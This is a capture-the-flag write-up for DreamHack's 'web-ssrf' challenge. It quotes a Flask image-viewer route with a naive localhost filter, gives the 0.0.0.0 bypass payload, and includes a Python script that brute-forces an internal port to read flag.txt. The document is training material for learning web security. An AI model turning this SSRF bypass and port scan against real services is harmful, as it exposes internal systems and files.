# web-ssrf — DreamHack

> **Room / Challenge:** web-ssrf (Web)

---

## Metadata

- **Author:** `jameskaois`
- **CTF:** DreamHack
- **Challenge:** web-ssrf (web)
- **Link**: `https://dreamhack.io/wargame/challenges/75`
- **Level:** `2`
- **Date:** `10-11-2025`

---

## Goal

Using image viewer service to capture the flag.

## My Solution

You can download and examine the source code [here](./web-ssrf.zip)

The source code has one main `app.py` which is the file runs the application, there is a route that we have to pay attention to `/img_viewer`:

```python
@app.route("/img_viewer", methods=["GET", "POST"])
def img_viewer():
    if request.method == "GET":
        return render_template("img_viewer.html")
    elif request.method == "POST":
        url = request.form.get("url", "")
        urlp = urlparse(url)
        if url[0] == "/":
            url = "http://localhost:8000" + url
        elif ("localhost" in urlp.netloc) or ("127.0.0.1" in urlp.netloc):
            data = open("error.png", "rb").read()
            img = base64.b64encode(data).decode("utf8")
            return render_template("img_viewer.html", img=img)
        try:
            data = requests.get(url, timeout=3).content
            img = base64.b64encode(data).decode("utf8")
        except:
            data = open("error.png", "rb").read()
            img = base64.b64encode(data).decode("utf8")
        return render_template("img_viewer.html", img=img)
```

Firstly, I tried several payloads to get the `flag.txt` content like `/flag.txt`, `/static/../flag.txt`, ... however all of them returns this base64 encoded:

```
PCFkb2N0eXBlIGh0bWw+CjxodG1sIGxhbmc9ZW4+Cjx0aXRsZT40MDQgTm90IEZvdW5kPC90aXRsZT4KPGgxPk5vdCBGb3VuZDwvaDE+CjxwPlRoZSByZXF1ZXN0ZWQgVVJMIHdhcyBub3QgZm91bmQgb24gdGhlIHNlcnZlci4gSWYgeW91IGVudGVyZWQgdGhlIFVSTCBtYW51YWxseSBwbGVhc2UgY2hlY2sgeW91ciBzcGVsbGluZyBhbmQgdHJ5IGFnYWluLjwvcD4K
```

Which is:

```
<!doctype html>
<html lang=en>
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
```

But notice there is other host that run in the same server:

```python
local_host = "127.0.0.1"
local_port = random.randint(1500, 1800)
local_server = http.server.HTTPServer(
    (local_host, local_port), http.server.SimpleHTTPRequestHandler
)
print(local_port)


def run_local_server():
    local_server.serve_forever()


threading._start_new_thread(run_local_server, ())
```

This is the file server when we bypass these 2 checks in the routes:

```python
if url[0] == "/":
    url = "http://localhost:8000" + url
elif ("localhost" in urlp.netloc) or ("127.0.0.1" in urlp.netloc):
    data = open("error.png", "rb").read()
    img = base64.b64encode(data).decode("utf8")
    return render_template("img_viewer.html", img=img)
```

The payload will be executed by making a GET requests:

```python
data = requests.get(url, timeout=3).content
img = base64.b64encode(data).decode("utf8")
```

To bypass the checks and also points to `localhost` we can use this payload:

```
http://0.0.0.0:{PORT}/flag.txt
```

`0.0.0.0` will points to `localhost`, but we have to find the correct port of the server since it is randomized between `1500` and `1800`, I created this Python script to get the correct port:

```python
import requests

target_url = "http://host1.dreamhack.games:12713/img_viewer"

for i in range(1500, 1801):
    res = requests.post(target_url, data={'url': f'http://0.0.0.0:{i}/flag.txt'})

    print(f"URL: http://0.0.0.0:{i}/flag.txt")

    if "Jggg==" not in res.text:
        print()
        print(f'GOT {i}')
        break
```

`Jggg==` is the base64 encoded string of the `error.png`, so if we don't get it we collect the correct port:

![Guide image](./screenshots/1.png)

Submit this payload URL to the UI to get the base64 encoded string:

![Guide image](./screenshots/2.png)

Decode this, we got the flag:

![Guide image](./screenshots/3.png)
